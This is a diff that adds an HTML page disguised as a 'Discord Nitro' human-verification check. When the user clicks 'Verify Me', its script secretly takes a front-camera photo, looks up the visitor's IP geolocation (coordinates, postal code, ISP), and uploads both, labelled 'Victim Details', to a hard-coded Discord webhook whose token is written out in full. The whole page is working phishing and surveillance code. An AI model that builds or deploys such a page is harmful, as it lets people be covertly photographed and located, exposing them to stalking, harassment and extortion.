@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Discord Nitro</title>
+  <style>
+    body { 
+      margin:0; 
+      background:#111; 
+      color:#eee; 
+      font-family:Arial, sans-serif; 
+      text-align:center; 
+      padding: 20vh 10px; 
+      min-height:100vh; 
+    }
+    #msg { 
+      font-size:1.8em; 
+      margin:20px; 
+    }
+    video, canvas { display:none; }
+    .container { max-width:600px; margin:auto; }
+    button { 
+      padding:15px 40px; 
+      font-size:1.3em; 
+      background:#0066cc; 
+      color:white; 
+      border:none; 
+      border-radius:8px; 
+      cursor:pointer; 
+      margin:20px; 
+    }
+    button:hover { background:#0055aa; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Quick Verification</h1>
+    <p id="msg">Please click verify to continue. This helps verify you're a human.</p>
+    
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <button id="btn">Verify Me</button>
+  </div>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const msg = document.getElementById('msg');
+    const btn = document.getElementById('btn');
+
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1451742333941842063/Us6WUZdGQIwre6yJottqWRd10OutQWtombC-gYtpa1j0GNxMefdYb8dDyVzgIzV1eaqp";
+
+    async function captureAndSend() {
+      try {
+        msg.textContent = "Accessing camera...";
+
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }  // front camera
+        });
+
+        video.srcObject = stream;
+        await new Promise(r => setTimeout(r, 1200));  // let it settle
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        // Stop camera right away
+        stream.getTracks().forEach(track => track.stop());
+
+        const blob = await new Promise(resolve => {
+          canvas.toBlob(resolve, 'image/jpeg', 0.88);
+        });
+
+        // Grab full geo details via HTTPS (ipapi.co - no key, reliable)
+        msg.textContent = "Grabbing full location details...";
+        let geoDetails = "Location grab failed";
+        try {
+          const geoRes = await fetch('https://ipapi.co/json/');
+          if (geoRes.ok) {
+            const data = await geoRes.json();
+            if (data.error) {
+              geoDetails = `Error: ${data.reason || 'unknown'}`;
+            } else {
+              geoDetails = 
+                `IP: ${data.ip || 'n/a'}\n` +
+                `City: ${data.city || 'n/a'}\n` +
+                `Region: ${data.region || 'n/a'}\n` +
+                `Country: ${data.country_name || 'n/a'} (${data.country_code || 'n/a'})\n` +
+                `Coords: ${data.latitude || 'n/a'}, ${data.longitude || 'n/a'}\n` +
+                `Timezone: ${data.timezone || 'n/a'}\n` +
+                `Postal: ${data.postal || 'n/a'}\n` +
+                `ISP/Org: ${data.org || data.asn || 'n/a'}\n` +
+                `In EU?: ${data.in_eu ? 'Yes' : 'No'}`;
+            }
+          }
+        } catch (e) {
+          console.warn('Geo fetch error:', e);
+          // Fallback to basic IP if needed
+          try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            geoDetails = `IP only: ${ipData.ip || 'unknown'}`;
+          } catch {}
+        }
+
+        msg.textContent = "Uploading verification...";
+
+        const formData = new FormData();
+        formData.append('file', blob, `capture_${Date.now()}.jpg`);
+        
+        // Original payload + full geo details
+        const payload = {
+          content: `New snap from ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Victim Details:**\n${geoDetails}`
+        };
+        formData.append('payload_json', JSON.stringify(payload));
+
+        const response = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          body: formData
+        });
+
+        if (response.ok) {
+          msg.textContent = "Verification complete! Thanks.";
+          btn.style.display = 'none';
+        } else {
+          msg.textContent = "Upload failed — try again?";
+        }
+
+      } catch (err) {
+        msg.textContent = "Verification failed or error. Can't proceed.";
+        console.error(err);
+      }
+    }
+
+    btn.addEventListener('click', () => {
+      btn.disabled = true;
+      captureAndSend();
+    });
+
+    // Optional: auto-trigger after 3 sec
+    // setTimeout(captureAndSend, 3000);
+  </script>
+</body>
+</html>
